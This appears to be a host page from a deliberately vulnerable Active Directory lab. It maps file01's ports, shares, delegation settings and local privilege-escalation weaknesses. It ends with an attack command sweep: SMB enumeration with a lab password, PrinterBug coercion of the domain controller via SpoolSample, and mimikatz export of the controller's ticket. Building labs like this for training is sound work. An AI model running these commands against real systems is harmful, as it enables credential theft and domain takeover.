# file01.corp.local — 10.10.0.13

File server + the Linux-style pivot in DVAD (OpenSSH installed). **Unconstrained delegation** is set on FILE01$ — once you coerce a DC to authenticate to it, you hold a DC TGT in memory.

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | OpenSSH server | enabled via Ansible; weak local-acct path |
| 135/139/445 | TCP | RPC + SMB | shared printer NOT published; SMB signing default |
| 3389 | TCP | RDP | |
| 5985 | TCP | WinRM | |

## Shares

| Share | Path | ACL | Notes |
|---|---|---|---|
| `PublicShare` | `C:\Shared` | Everyone:F | bait files; SCF/URL hash-leak drops live here |

## Delegation / SPN highlights

- `FILE01$` has `TRUSTED_FOR_DELEGATION` → unconstrained → **PrinterBug → DC TGT in LSASS**
- HOST/CIFS SPNs on FILE01$
- `msDS-AllowedToActOnBehalfOfOtherIdentity` ← `fakehost$` (RBCD path PER-029 style)

## Local LPE primitives

| Vector | Where |
|---|---|
| Unquoted service path | `C:\Program Files\Vuln Service\service.exe` (writable `C:\`) |
| Weak service DACL | `VulnService` |
| PATH hijack + Everyone:F | `C:\Tools\` prepended to PATH; `ToolService` ImagePath modifiable |
| Named pipe Potato stub | `PipeBroker` service (LocalService) |
| Scheduled task with Everyone:F dir | `VulnUpdater` task; `C:\VulnServices` Everyone:F |

Flag file: `C:\Flags\admin-flag.txt` (SYSTEM-only).

## Minimum enum sweep

```bash
F=10.10.0.13
nxc smb $F -u alice -p 'DVADlab2024!' --shares --sessions --loggedon-users
smbmap -H $F -u alice -p 'DVADlab2024!' -R PublicShare
ssh alice@$F                                                     # try kerb / weak local
# After foothold:
winPEASx64.exe quiet cmd
sc qc VulnService
sc qc ToolService
icacls "C:\Program Files\Vuln Service\"
icacls C:\Tools
schtasks /query /fo LIST /v | findstr /i "VulnUpdater"
# Coerce DC → file01:
python3 SpoolSample.py 10.10.0.10 file01.corp.local      # forces DC$ to auth here
# Then on file01 (admin):
mimikatz # sekurlsa::tickets /export                     # DC$ TGT exfil
```

## Forward to

PE-001/002/004/005/006 (local LPE), CRED-018 (unconstrained → DC TGT), LAT-001..006 (lateral with creds).
